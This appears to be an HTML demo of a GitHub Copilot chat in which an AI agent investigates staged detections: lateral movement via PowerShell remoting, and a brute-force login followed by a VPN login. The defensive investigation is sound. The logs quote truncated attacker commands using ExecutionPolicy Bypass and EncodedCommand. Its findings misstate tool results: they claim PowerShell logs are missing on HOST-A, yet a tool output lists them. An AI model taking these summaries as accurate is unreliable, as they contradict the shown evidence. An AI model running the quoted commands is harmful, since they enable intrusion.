@@ -1,0 +1,1681 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>GitHub Copilot - MCP Security Investigations</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+      background-color: #1e1e1e;
+      color: #d4d4d4;
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .app-shell {
+      display: flex;
+      flex-direction: column;
+      height: 100%;
+    }
+
+    .titlebar {
+      height: 36px;
+      background: #3c3c3c;
+      display: flex;
+      align-items: center;
+      padding: 0 12px;
+      color: #e0e0e0;
+      font-size: 12px;
+      gap: 12px;
+      border-bottom: 1px solid #2a2a2a;
+    }
+
+    .titlebar-dot {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background: #d96b5f;
+    }
+
+    .titlebar-dot:nth-child(2) { background: #e0b053; }
+    .titlebar-dot:nth-child(3) { background: #63c566; }
+
+    .titlebar-filename {
+      margin-left: 8px;
+      opacity: 0.9;
+    }
+
+    .main {
+      display: flex;
+      flex: 1;
+      min-height: 0;
+    }
+
+    .sidebar {
+      width: 54px;
+      background: #252526;
+      border-right: 1px solid #2a2a2a;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 8px 0;
+      gap: 8px;
+    }
+
+    .sidebar-icon {
+      width: 28px;
+      height: 28px;
+      border-radius: 6px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: default;
+      color: #ccc;
+      font-size: 14px;
+    }
+
+    .sidebar-icon.active { background: #37373d; color: #4ec9b0; }
+
+    .content {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      min-width: 0;
+    }
+
+    .tabbar {
+      height: 32px;
+      background: #252526;
+      border-bottom: 1px solid #2a2a2a;
+      display: flex;
+      align-items: flex-end;
+      font-size: 12px;
+    }
+
+    .tab {
+      display: flex;
+      align-items: center;
+      padding: 0 12px;
+      height: 100%;
+      border-right: 1px solid #2a2a2a;
+      color: #ccc;
+      cursor: pointer;
+    }
+
+    .tab.active {
+      background: #1e1e1e;
+      border-bottom: 2px solid #007acc;
+      color: #fff;
+    }
+
+    .chat-screen {
+      flex: 1;
+      overflow-y: auto;
+      padding: 16px 24px 8px;
+      max-width: 960px;
+      margin: 0 auto;
+      width: 100%;
+      display: none;
+    }
+
+    .chat-screen.active {
+      display: block;
+    }
+
+    .message {
+      margin-bottom: 24px;
+      display: flex;
+      gap: 12px;
+      animation: fadeIn 0.25s ease-out;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(4px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .avatar {
+      width: 28px;
+      height: 28px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: 600;
+      font-size: 14px;
+      flex-shrink: 0;
+    }
+
+    .avatar.user { background: #0e639c; color: #fff; }
+    .avatar.copilot {
+      background: linear-gradient(135deg, #e3b341, #d48c3c);
+      color: #000;
+    }
+
+    .bubble {
+      flex: 1;
+      font-size: 13px;
+      line-height: 1.6;
+    }
+
+    .user-text { color: #e0e0e0; }
+    .copilot-text p { margin-bottom: 10px; }
+
+    .thinking {
+      font-style: italic;
+      color: #808080;
+      margin-bottom: 8px;
+      font-size: 12px;
+    }
+
+    .thinking::after {
+      content: '...';
+      animation: dots 1.4s steps(4, end) infinite;
+    }
+
+    @keyframes dots {
+      0%, 20% { content: '.'; }
+      40% { content: '..'; }
+      60%, 100% { content: '...'; }
+    }
+
+    .detection-list { margin-top: 8px; }
+
+    .detection-card {
+      background: #252526;
+      border-radius: 6px;
+      border: 1px solid #3e3e42;
+      padding: 12px 14px;
+      margin-bottom: 10px;
+      font-size: 12px;
+    }
+
+    .detection-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 6px;
+    }
+
+    .detection-name {
+      font-weight: 600;
+      color: #e0e0e0;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .badge {
+      border-radius: 999px;
+      padding: 2px 8px;
+      font-size: 11px;
+      font-weight: 600;
+    }
+
+    .badge-critical { background: #f48771; color: #1e1e1e; }
+    .badge-high { background: #ff6b6b; color: #fff; }
+    .badge-medium { background: #ffa726; color: #1e1e1e; }
+
+    .detection-row {
+      display: flex;
+      gap: 6px;
+      margin-top: 2px;
+      color: #9cdcfe;
+    }
+
+    .detection-label { min-width: 84px; color: #808080; }
+
+    .tool-block {
+      background: #252526;
+      border-radius: 6px;
+      border: 1px solid #3e3e42;
+      margin: 10px 0;
+      font-family: Consolas, "Liberation Mono", Menlo, monospace;
+      font-size: 12px;
+      overflow: hidden;
+    }
+
+    .tool-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 8px 10px;
+      cursor: pointer;
+      background: #2d2d30;
+      gap: 8px;
+    }
+
+    .tool-summary {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      color: #4ec9b0;
+      min-width: 0;
+    }
+
+    .tool-arrow {
+      font-size: 12px;
+      color: #c5c5c5;
+    }
+
+    .tool-name {
+      font-weight: 600;
+      white-space: nowrap;
+    }
+
+    .tool-right {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      margin-left: auto;
+    }
+
+    .tool-server {
+      font-size: 11px;
+      color: #c5c5c5;
+      opacity: 0.9;
+      white-space: nowrap;
+    }
+
+    .tool-status {
+      font-size: 12px;
+      color: #4ec9b0;
+    }
+
+    .chevron {
+      width: 16px;
+      height: 16px;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      color: #c5c5c5;
+      transition: transform 0.15s ease-out;
+    }
+
+    .tool-block.open .chevron { transform: rotate(90deg); }
+
+    .tool-body { display: none; border-top: 1px solid #3e3e42; }
+    .tool-block.open .tool-body { display: block; }
+
+    .tool-section { padding: 8px 10px; }
+
+    .tool-section-title {
+      color: #9cdcfe;
+      margin-bottom: 4px;
+      font-weight: 600;
+    }
+
+    .code-line {
+      white-space: pre;
+      word-break: normal;
+      color: #ce9178;
+      display: block;
+      overflow-x: auto;
+    }
+
+    .input-bar {
+      border-top: 1px solid #2a2a2a;
+      background: #252526;
+      padding: 8px 16px;
+    }
+
+    .input-wrapper {
+      max-width: 960px;
+      margin: 0 auto;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      background: #1e1e1e;
+      border: 1px solid #3e3e42;
+      border-radius: 6px;
+      padding: 6px 10px;
+    }
+
+    .input-wrapper input {
+      flex: 1;
+      background: transparent;
+      border: none;
+      outline: none;
+      color: #d4d4d4;
+      font-size: 13px;
+    }
+
+    .input-wrapper span {
+      font-size: 11px;
+      color: #808080;
+    }
+
+    .section-divider {
+      border: 0;
+      border-top: 1px solid #3e3e42;
+      margin: 18px 0 10px;
+    }
+  </style>
+</head>
+<body>
+  <div class="app-shell">
+    <div class="titlebar">
+      <div class="titlebar-dot"></div>
+      <div class="titlebar-dot"></div>
+      <div class="titlebar-dot"></div>
+      <div class="titlebar-filename">GitHub Copilot · MCP Security Investigations</div>
+    </div>
+
+    <div class="main">
+      <aside class="sidebar">
+        <div class="sidebar-icon active"></div>
+        <div class="sidebar-icon"></div>
+        <div class="sidebar-icon"></div>
+      </aside>
+
+      <div class="content">
+        <div class="tabbar">
+          <div class="tab active" data-target="#usecase1">Use Case 1 · Lateral Movement</div>
+          <div class="tab" data-target="#usecase2">Use Case 2 · Credential Abuse</div>
+        </div>
+
+        <!-- USE CASE 1: LATERAL MOVEMENT -->
+        <div class="chat-screen active" id="usecase1">
+          <!-- User prompt -->
+          <div class="message">
+            <div class="avatar user">U</div>
+            <div class="bubble user-text">
+              Get the top 3 detections and investigate. You can use all the mcp tools available.
+            </div>
+          </div>
+
+          <!-- Copilot thinking + first response -->
+          <div class="message">
+            <div class="avatar copilot">C</div>
+            <div class="bubble copilot-text">
+              <!-- <div class="thinking">Thinking</div> -->
+              <p>Let me start by looking at your latest high-severity detections in CrowdStrike. I’ll focus on whatever looks most critical and then pivot as needed.</p>
+            </div>
+          </div>
+
+          <!-- Falcon: detections -->
+          <div class="message">
+            <div class="avatar copilot">C</div>
+            <div class="bubble copilot-text">
+              <p>First, I’m pulling the recent open high-severity incidents.</p>
+
+              <div class="tool-block">
+                <div class="tool-header" data-toggle>
+                  <div class="tool-summary">
+                    <span class="tool-arrow">➜</span>
+                    <span class="tool-name">incidents.read</span>
+                  </div>
+                  <div class="tool-right">
+                    <span class="tool-server">falcon-mcp</span>
+                    <span class="tool-status">✔</span>
+                    <div class="chevron">▶</div>
+                  </div>
+                </div>
+                <div class="tool-body">
+                  <div class="tool-section">
+                    <div class="tool-section-title">Input</div>
+<pre class="code-line">{
+  "filter": "severity:&gt;='high'+status:'open'",
+  "limit": 3,
+  "sort": "start_time.desc"
+}</pre>
+                  </div>
+                  <div class="tool-section">
+                    <div class="tool-section-title">Output</div>
+<pre class="code-line">{
+  "incidents": [
+    {
+      "id": "INC-PS-REMOTE-HOST-A-001",
+      "title": "Suspicious Lateral Movement via PowerShell Remoting on HOST-A",
+      "severity": "critical",
+      "user": "corp\\svc-admin",
+      "target_host": "HOST-B",
+      "status": "open"
+    },
+    {
+      "id": "INC-RDP-BRUTE-001",
+      "title": "RDP brute-force attempt against jump host",
+      "severity": "high",
+      "status": "open"
+    },
+    {
+      "id": "INC-OFFICE-MACRO-001",
+      "title": "Suspicious Office macro spawning cmd.exe",
+      "severity": "medium",
+      "status": "open"
+    }
+  ]
+}</pre>
+                  </div>
+                </div>
+              </div>
+
+              <p>The first one is the most critical and directly mentions lateral movement, so I’ll expand that.</p>
+
+              <div class="thinking">Pulling detailed incident and asset context</div>
+
+              <div class="tool-block">
+                <div class="tool-header" data-toggle>
+                  <div class="tool-summary">
+                    <span class="tool-arrow">➜</span>
+                    <span class="tool-name">incidents.read</span>
+                  </div>
+                  <div class="tool-right">
+                    <span class="tool-server">falcon-mcp</span>
+                    <span class="tool-status">✔</span>
+                    <div class="chevron">▶</div>
+                  </div>
+                </div>
+                <div class="tool-body">
+                  <div class="tool-section">
+                    <div class="tool-section-title">Input</div>
+<pre class="code-line">{
+  "incident_id": "INC-PS-REMOTE-HOST-A-001"
+}</pre>
+                  </div>
+                  <div class="tool-section">
+                    <div class="tool-section-title">Output</div>
+<pre class="code-line">{
+  "incident": {
+    "id": "INC-PS-REMOTE-HOST-A-001",
+    "source_host": "HOST-A",
+    "destination_host": "HOST-B",
+    "user": "corp\\svc-admin",
+    "parent_chain": [
+      "winlogon.exe",
+      "explorer.exe"
+    ],
+    "process": "powershell.exe",
+    "command_line": "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Invoke-Command -ComputerName HOST-B ...",
+    "reason": "Anomalous remote PowerShell session with credential reuse and rare destination host",
+    "timestamp_utc": "2025-12-03T10:44:51Z"
+  }
+}</pre>
+                  </div>
+                </div>
+              </div>
+
+              <p>So we have a privileged account on <code>HOST-A</code> using PowerShell remoting to reach <code>HOST-B</code>. I’ll quickly confirm what these hosts are in the inventory.</p>
+
+              <div class="tool-block">
+                <div class="tool-header" data-toggle>
+                  <div class="tool-summary">
+                    <span class="tool-arrow">➜</span>
+                    <span class="tool-name">discover.hosts</span>
+                  </div>
+                  <div class="tool-right">
+                    <span class="tool-server">falcon-mcp</span>
+                    <span class="tool-status">✔</span>
+                    <div class="chevron">▶</div>
+                  </div>
+                </div>
+                <div class="tool-body">
+                  <div class="tool-section">
+                    <div class="tool-section-title">Input</div>
+<pre class="code-line">{
+  "hostname": [
+    "HOST-A",
+    "HOST-B"
+  ]
+}</pre>
+                  </div>
+                  <div class="tool-section">
+                    <div class="tool-section-title">Output</div>
+<pre class="code-line">{
+  "hosts": [
+    {
+      "hostname": "HOST-A",
+      "os": "Windows Server 2019",
+      "role": "file_server",
+      "groups": [
+        "PROD-FILESRV"
+      ],
+      "sensor_status": "healthy"
+    },
+    {
+      "hostname": "HOST-B",
+      "os": "Windows Server 2019",
+      "role": "app_server",
+      "notes": "rarely accessed via PowerShell from HOST-A"
+    }
+  ]
+}</pre>
+                  </div>
+                </div>
+              </div>
+
+              <p>Next I want to see how this shows up in your SIEM logs and whether UEBA also sees it as abnormal.</p>
+            </div>
+          </div>
+
+          <!-- Log360Cloud: SIEM + UEBA -->
+          <div class="message">
+            <div class="avatar copilot">C</div>
+            <div class="bubble copilot-text">
+              <p>I’ll check Log360Cloud to confirm log ingestion and then look for the corresponding remote logons and PowerShell activity.</p>
+
+              <div class="tool-block">
+                <div class="tool-header" data-toggle>
+                  <div class="tool-summary">
+                    <span class="tool-arrow">➜</span>
+                    <span class="tool-name">get_log_sources</span>
+                  </div>
+                  <div class="tool-right">
+                    <span class="tool-server">log360cloud-mcp</span>
+                    <span class="tool-status">✔</span>
+                    <div class="chevron">▶</div>
+                  </div>
+                </div>
+                <div class="tool-body">
+                  <div class="tool-section">
+                    <div class="tool-section-title">Input</div>
+<pre class="code-line">{
+  "filter": "hostname IN ('HOST-A','HOST-B')"
+}</pre>
+                  </div>
+                  <div class="tool-section">
+                    <div class="tool-section-title">Output</div>
+<pre class="code-line">{
+  "sources": [
+    {
+      "hostname": "HOST-A",
+      "log_types": [
+        "Windows Security",
+        "PowerShell Operational"
+      ],
+      "status": "OK"
+    },
+    {
+      "hostname": "HOST-B",
+      "log_types": [
+        "Windows Security",
+        "IIS"
+      ],
+      "status": "OK"
+    }
+  ]
+}</pre>
+                  </div>
+                </div>
+              </div>
+
+              <p>With logs flowing, I’ll query for the remote logons from <code>HOST-A</code> to <code>HOST-B</code> around the same time.</p>
+
+              <div class="tool-block">
+                <div class="tool-header" data-toggle>
+                  <div class="tool-summary">
+                    <span class="tool-arrow">➜</span>
+                    <span class="tool-name">generate_query</span>
+                  </div>
+                  <div class="tool-right">
+                    <span class="tool-server">log360cloud-mcp</span>
+                    <span class="tool-status">✔</span>
+                    <div class="chevron">▶</div>
+                  </div>
+                </div>
+                <div class="tool-body">
+                  <div class="tool-section">
+                    <div class="tool-section-title">Input</div>
+<pre class="code-line">{
+  "query": "Show remote logons from HOST-A to HOST-B",
+  "window": "last 2 hours"
+}</pre>
+                  </div>
+                  <div class="tool-section">
+                    <div class="tool-section-title">Output</div>
+<pre class="code-line">{
+  "query": "SELECT * FROM security_logs WHERE source_host = 'HOST-A' AND target_host = 'HOST-B' AND event_id = 4624 AND logon_type = 3 AND timestamp &gt;= now()-2h"
+}</pre>
+                  </div>
+                </div>
+              </div>
+
+              <div class="tool-block">
+                <div class="tool-header" data-toggle>
+                  <div class="tool-summary">
+                    <span class="tool-arrow">➜</span>
+                    <span class="tool-name">execute_query</span>
+                  </div>
+                  <div class="tool-right">
+                    <span class="tool-server">log360cloud-mcp</span>
+                    <span class="tool-status">✔</span>
+                    <div class="chevron">▶</div>
+                  </div>
+                </div>
+                <div class="tool-body">
+                  <div class="tool-section">
+                    <div class="tool-section-title">Input</div>
+<pre class="code-line">{
+  "query": "SELECT * FROM security_logs WHERE source_host = 'HOST-A' AND target_host = 'HOST-B' AND event_id = 4624 AND logon_type = 3 AND timestamp &gt;= now()-2h"
+}</pre>
+                  </div>
+                  <div class="tool-section">
+                    <div class="tool-section-title">Output</div>
+<pre class="code-line">{
+  "rows": [
+    {
+      "event_id": 4624,
+      "logon_type": 3,
+      "source_host": "HOST-A",
+      "target_host": "HOST-B",
+      "user": "corp\\svc-admin",
+      "process_name": "powershell.exe",
+      "network_protocol": "WinRM",
+      "timestamp_utc": "2025-12-03T10:40:10Z"
+    }
+  ]
+}</pre>
+                  </div>
+                </div>
+              </div>
+
+              <div class="tool-block">
+                <div class="tool-header" data-toggle>
+                  <div class="tool-summary">
+                    <span class="tool-arrow">➜</span>
+                    <span class="tool-name">generate_query</span>
+                  </div>
+                  <div class="tool-right">
+                    <span class="tool-server">log360cloud-mcp</span>
+                    <span class="tool-status">✔</span>
+                    <div class="chevron">▶</div>
+                  </div>
+                </div>
+                <div class="tool-body">
+                  <div class="tool-section">
+                    <div class="tool-section-title">Input</div>
+<pre class="code-line">{
+  "query": "Show PowerShell execution with network connections from HOST-A",
+  "window": "last 2 hours"
+}</pre>
+                  </div>
+                  <div class="tool-section">
+                    <div class="tool-section-title">Output</div>
+<pre class="code-line">{
+  "query": "SELECT * FROM process_logs WHERE host = 'HOST-A' AND process_name = 'powershell.exe' AND has_network_connections = true AND timestamp &gt;= now()-2h"
+}</pre>
+                  </div>
+                </div>
+              </div>
+
+              <div class="tool-block">
+                <div class="tool-header" data-toggle>
+                  <div class="tool-summary">
+                    <span class="tool-arrow">➜</span>
+                    <span class="tool-name">execute_query</span>
+                  </div>
+                  <div class="tool-right">
+                    <span class="tool-server">log360cloud-mcp</span>
+                    <span class="tool-status">✔</span>
+                    <div class="chevron">▶</div>
+                  </div>
+                </div>
+                <div class="tool-body">
+                  <div class="tool-section">
+                    <div class="tool-section-title">Input</div>
+<pre class="code-line">{
+  "query": "SELECT * FROM process_logs WHERE host = 'HOST-A' AND process_name = 'powershell.exe' AND has_network_connections = true AND timestamp &gt;= now()-2h"
+}</pre>
+                  </div>
+                  <div class="tool-section">
+                    <div class="tool-section-title">Output</div>
+<pre class="code-line">{
+  "rows": [
+    {
+      "host": "HOST-A",
+      "process_name": "powershell.exe",
+      "command_line": "powershell.exe -ExecutionPolicy Bypass -EncodedCommand ...",
+      "destinations": [
+        "HOST-B:5985",
+        "198.51.100.50:443"
+      ],
+      "timestamp_utc": "2025-12-03T10:42:30Z"
+    }
+  ]
+}</pre>
+                  </div>
+                </div>
+              </div>
+
+              <div class="thinking">Checking if this is normal behaviour for the identity and host</div>
+
+              <p>To understand how unusual this is, I’m looking at UEBA scores for the account and source host.</p>
+
+              <div class="tool-block">
+                <div class="tool-header" data-toggle>
+                  <div class="tool-summary">
+                    <span class="tool-arrow">➜</span>
+                    <span class="tool-name">get_user_risk_score</span>
+                  </div>
+                  <div class="tool-right">
+                    <span class="tool-server">log360cloud-mcp</span>
+                    <span class="tool-status">✔</span>
+                    <div class="chevron">▶</div>
+                  </div>
+                </div>
+                <div class="tool-body">
+                  <div class="tool-section">
+                    <div class="tool-section-title">Input</div>
+<pre class="code-line">{
+  "user": "corp\\svc-admin"
+}</pre>
+                  </div>
+                  <div class="tool-section">
+                    <div class="tool-section-title">Output</div>
+<pre class="code-line">{
+  "user": "corp\\svc-admin",
+  "score": 86,
+  "risk_level": "high",
+  "drivers": [
+    "rare source IP for admin activity",
+    "outside business-hours logons",
+    "first-time PowerShell remoting to HOST-B"
+  ]
+}</pre>
+                  </div>
+                </div>
+              </div>
+
+              <div class="tool-block">
+                <div class="tool-header" data-toggle>
+                  <div class="tool-summary">
+                    <span class="tool-arrow">➜</span>
+                    <span class="tool-name">get_entity_risk_score</span>
+                  </div>
+                  <div class="tool-right">
+                    <span class="tool-server">log360cloud-mcp</span>
+                    <span class="tool-status">✔</span>
+                    <div class="chevron">▶</div>
+                  </div>
+                </div>
+                <div class="tool-body">
+                  <div class="tool-section">
+                    <div class="tool-section-title">Input</div>
+<pre class="code-line">{
+  "entity": "HOST-A"
+}</pre>
+                  </div>
+                  <div class="tool-section">
+                    <div class="tool-section-title">Output</div>
+<pre class="code-line">{
+  "entity": "HOST-A",
+  "score": 72,
+  "risk_level": "medium",
+  "drivers": [
+    "spike in outbound WinRM connections",
+    "unusual destination pair HOST-A → HOST-B",
+    "increase in failed authentication attempts"
+  ]
+}</pre>
+                  </div>
+                </div>
+              </div>
+
+              <p>So far, everything points to suspicious lateral movement that’s also anomalous for both the user and the host. I’ll now look at the endpoint telemetry to see exactly what executed.</p>
+            </div>
+          </div>
+
+          <!-- SentinelOne: endpoint -->
+          <div class="message">
+            <div class="avatar copilot">C</div>
+            <div class="bubble copilot-text">
+              <p>Next, I’m checking SentinelOne for the process lineage around PowerShell and any associated payloads.</p>
+
+              <div class="tool-block">
+                <div class="tool-header" data-toggle>
+                  <div class="tool-summary">
+                    <span class="tool-arrow">➜</span>
+                    <span class="tool-name">commands.process-list</span>
+                  </div>
+                  <div class="tool-right">
+                    <span class="tool-server">sentinelone-mcp</span>
+                    <span class="tool-status">✔</span>
+                    <div class="chevron">▶</div>
+                  </div>
+                </div>
+                <div class="tool-body">
+                  <div class="tool-section">
+                    <div class="tool-section-title">Input</div>
+<pre class="code-line">{
+  "agent_id": "HOST-A-agent",
+  "time_range": "incident_window_±10m",
+  "focus": "powershell.exe"
+}</pre>
+                  </div>
+                  <div class="tool-section">
+                    <div class="tool-section-title">Output</div>
+<pre class="code-line">{
+  "process_tree": {
+    "root": "explorer.exe",
+    "children": [
+      {
+        "name": "cmd.exe",
+        "children": [
+          {
+            "name": "powershell.exe",
+            "children": [
+              {
+                "name": "rundll32.exe",
+                "image_path": "C:\\\\ProgramData\\\\temp\\\\&lt;random&gt;.dll"
+              }
+            ]
+          }
+        ]
+      }
+    ]
+  }
+}</pre>
+                  </div>
+                </div>
+              </div>
+
+              <div class="tool-block">
+                <div class="tool-header" data-toggle>
+                  <div class="tool-summary">
+                    <span class="tool-arrow">➜</span>
+                    <span class="tool-name">telemetry.events</span>
+                  </div>
+                  <div class="tool-right">
+                    <span class="tool-server">sentinelone-mcp</span>
+                    <span class="tool-status">✔</span>
+                    <div class="chevron">▶</div>
+                  </div>
+                </div>
+                <div class="tool-body">
+                  <div class="tool-section">
+                    <div class="tool-section-title">Input</div>
+<pre class="code-line">{
+  "filter": "host:HOST-A AND process:powershell.exe",
+  "window": "incident_window"
+}</pre>
+                  </div>
+                  <div class="tool-section">
+                    <div class="tool-section-title">Output</div>
+<pre class="code-line">{
+  "events": [
+    {
+      "host": "HOST-A",
+      "process_name": "powershell.exe",
+      "script_type": "obfuscated",
+      "behavior": "in-memory payload decode",
+      "child_process": "rundll32.exe",
+      "dll_hash": "known-lateral-movement-toolkit-hash"
+    },
+    {
+      "host": "HOST-B",
+      "event_type": "service_created",
+      "service_name": "&lt;random_service&gt;",
+      "image_path": "C:\\\\ProgramData\\\\temp\\\\&lt;random&gt;.dll"
+    }
+  ]
+}</pre>
+                  </div>
+                </div>
+              </div>
+
+              <p>This confirms that the session wasn’t just reconnaissance; it actually deployed tooling and established persistence on the destination host.</p>
+            </div>
+          </div>
+
+          <!-- Elastic: artefacts -->
+          <div class="message">
+            <div class="avatar copilot">C</div>
+            <div class="bubble copilot-text">
+              <p>To complete the picture, I’m checking Elastic for remote logons, transcripts and file/registry artefacts on the destination.</p>
+
+              <div class="tool-block">
+                <div class="tool-header" data-toggle>
+                  <div class="tool-summary">
+                    <span class="tool-arrow">➜</span>
+                    <span class="tool-name">elastic.search</span>
+                  </div>
+                  <div class="tool-right">
+                    <span class="tool-server">elastic-mcp</span>
+                    <span class="tool-status">✔</span>
+                    <div class="chevron">▶</div>
+                  </div>
+                </div>
+                <div class="tool-body">
+                  <div class="tool-section">
+                    <div class="tool-section-title">Input</div>
+<pre class="code-line">{
+  "indices": ["windows-security-*"],
+  "query": "(event.code:4624 AND logon_type:(3 OR 10)) AND source_host:HOST-A AND target_host:HOST-B",
+  "time_range": "incident_window"
+}</pre>
+                  </div>
+                  <div class="tool-section">
+                    <div class="tool-section-title">Output</div>
+<pre class="code-line">{
+  "hits": [
+    {
+      "event.code": 4624,
+      "logon_type": 3,
+      "source_host": "HOST-A",
+      "target_host": "HOST-B",
+      "user": "corp\\svc-admin",
+      "timestamp_utc": "2025-12-03T10:42:45Z"
+    }
+  ]
+}</pre>
+                  </div>
+                </div>
+              </div>
+
+              <div class="tool-block">
+                <div class="tool-header" data-toggle>
+                  <div class="tool-summary">
+                    <span class="tool-arrow">➜</span>
+                    <span class="tool-name">elastic.search</span>
+                  </div>
+                  <div class="tool-right">
+                    <span class="tool-server">elastic-mcp</span>
+                    <span class="tool-status">✔</span>
+                    <div class="chevron">▶</div>
+                  </div>
+                </div>
+                <div class="tool-body">
+                  <div class="tool-section">
+                    <div class="tool-section-title">Input</div>
+<pre class="code-line">{
+  "indices": ["powershell-transcripts-*"],
+  "query": "host:HOST-A AND script_block_text:(Invoke-Command AND HOST-B)"
+}</pre>
+                  </div>
+                  <div class="tool-section">
+                    <div class="tool-section-title">Output</div>
+<pre class="code-line">{
+  "hits": [
+    {
+      "host": "HOST-A",
+      "script_block_text": "Invoke-Command -ComputerName HOST-B -ScriptBlock { ... service enumeration and creation ... }",
+      "timestamp_utc": "2025-12-03T10:43:15Z"
+    }
+  ]
+}</pre>
+                  </div>
+                </div>
+              </div>
+
+              <div class="tool-block">
+                <div class="tool-header" data-toggle>
+                  <div class="tool-summary">
+                    <span class="tool-arrow">➜</span>
+                    <span class="tool-name">elastic.search</span>
+                  </div>
+                  <div class="tool-right">
+                    <span class="tool-server">elastic-mcp</span>
+                    <span class="tool-status">✔</span>
+                    <div class="chevron">▶</div>
+                  </div>
+                </div>
+                <div class="tool-body">
+                  <div class="tool-section">
+                    <div class="tool-section-title">Input</div>
+<pre class="code-line">{
+  "indices": ["sysmon-*","windows-sysmon-*"],
+  "query": "host:HOST-B AND (event_id:11 OR event_id:13) AND (ProgramData/temp OR services.exe)"
+}</pre>
+                  </div>
+                  <div class="tool-section">
+                    <div class="tool-section-title">Output</div>
+<pre class="code-line">{
+  "hits": [
+    {
+      "host": "HOST-B",
+      "event_id": 11,
+      "file_path": "C:\\\\ProgramData\\\\temp\\\\&lt;random&gt;.dll",
+      "timestamp_utc": "2025-12-03T10:46:00Z"
+    },
+    {
+      "host": "HOST-B",
+      "event_id": 13,
+      "registry_path": "HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\&lt;random_service&gt;",
+      "timestamp_utc": "2025-12-03T10:46:05Z"
+    }
+  ]
+}</pre>
+                  </div>
+                </div>
+              </div>
+
+              <!-- SHORTENED FINDINGS FOR USE CASE 1 -->
+              <h3>Findings 🧭</h3>
+              <p>
+                This is a **real lateral movement attempt**, not harmless admin work. A privileged user on
+                <code>HOST-A</code> used **encoded PowerShell remoting** to reach <code>HOST-B</code>,
+                dropped a DLL, and created a service – classic attacker behaviour.
+              </p>
+
+              <h4>What each tool shows 🔍</h4>
+              <ul>
+                <li>
+                  <strong>CrowdStrike Falcon</strong> – Detects suspicious PowerShell Remoting from
+                  <code>HOST-A</code> → <code>HOST-B</code> with an encoded command and a privileged
+                  account. Process tree: <code>explorer.exe → cmd.exe → powershell.exe → rundll32.exe</code>.
+                </li>
+                <li>
+                  <strong>Log360Cloud (SIEM + UEBA)</strong> – Confirms remote logons and WinRM activity,
+                  and flags the user/host as **high risk** (first-time remoting to HOST-B, unusual timing).
+                  A key gap: missing detailed PowerShell logs from <code>HOST-A</code>, leaving part of the
+                  execution chain invisible at SIEM level.
+                </li>
+                <li>
+                  <strong>SentinelOne</strong> – Shows obfuscated PowerShell, in-memory payload decoding,
+                  and a new DLL + service on <code>HOST-B</code>, indicating **tool deployment and
+                  persistence**, not just recon.
+                </li>
+                <li>
+                  <strong>Elastic</strong> – Correlates security events, PowerShell transcripts and Sysmon
+                  artefacts (file + registry changes) to confirm that the remote session was actively used
+                  to modify the system.
+                </li>
+              </ul>
+
+              <h4>Verdict ✅</h4>
+              <p>
+                Cross-tool evidence clearly confirms an **active lateral movement operation** from
+                <code>HOST-A</code> to <code>HOST-B</code>. Immediate actions should include isolating both
+                hosts, rotating credentials for the admin account, and **enabling full PowerShell logging on
+                HOST-A** to close the current visibility gap.
+              </p>
+            </div>
+          </div>
+
+        <!-- USE CASE 2: COMPROMISED CREDENTIAL & IDENTITY ABUSE -->
+        </div>
+        <div class="chat-screen" id="usecase2">
+          <!-- User prompt -->
+          <div class="message">
+            <div class="avatar user">U</div>
+            <div class="bubble user-text">
+              Investigate this Elastic alert: “Multiple Failed Login Attempts Followed by Successful Login from external IP”.
+            </div>
+          </div>
+
+          <!-- Copilot first response -->
+          <div class="message">
+            <div class="avatar copilot">C</div>
+            <div class="bubble copilot-text">
+              <!-- <div class="thinking">Thinking</div> -->
+              <p>Okay, I’ll start from the Elastic context to see how those failed and successful logins are distributed around that external IP.</p>
+            </div>
+          </div>
+
+          <!-- Elastic: auth pattern -->
+          <div class="message">
+            <div class="avatar copilot">C</div>
+            <div class="bubble copilot-text">
+              <p>First, I’m going to pull the authentication events related to the IP mentioned in the alert.</p>
+
+              <div class="tool-block">
+                <div class="tool-header" data-toggle>
+                  <div class="tool-summary">
+                    <span class="tool-arrow">➜</span>
+                    <span class="tool-name">elastic.search</span>
+                  </div>
+                  <div class="tool-right">
+                    <span class="tool-server">elastic-mcp</span>
+                    <span class="tool-status">✔</span>
+                    <div class="chevron">▶</div>
+                  </div>
+                </div>
+                <div class="tool-body">
+                  <div class="tool-section">
+                    <div class="tool-section-title">Input</div>
+<pre class="code-line">{
+  "indices": ["auth-logs-*"],
+  "query": "event.action:(\"login_failed\" OR \"login_success\") AND source.ip:\"203.0.113.10\"",
+  "time_range": "last 2 hours"
+}</pre>
+                  </div>
+                  <div class="tool-section">
+                    <div class="tool-section-title">Output</div>
+<pre class="code-line">{
+  "events": [
+    {
+      "action": "login_failed",
+      "user": "USER-Z",
+      "source_ip": "203.0.113.10",
+      "timestamp_utc": "2025-12-03T06:10:00Z"
+    },
+    {
+      "action": "login_success",
+      "user": "USER-Z",
+      "source_ip": "203.0.113.10",
+      "device": "vpn-gateway-01",
+      "timestamp_utc": "2025-12-03T06:22:14Z"
+    }
+  ],
+  "failed_count": 35,
+  "successful_count": 1
+}</pre>
+                  </div>
+                </div>
+              </div>
+
+              <p>This is a classic “many failures then one success” pattern. I’ll check Log360Cloud for how normal this is for the user and the IP.</p>
+            </div>
+          </div>
+
+          <!-- Log360Cloud: identity & behaviour -->
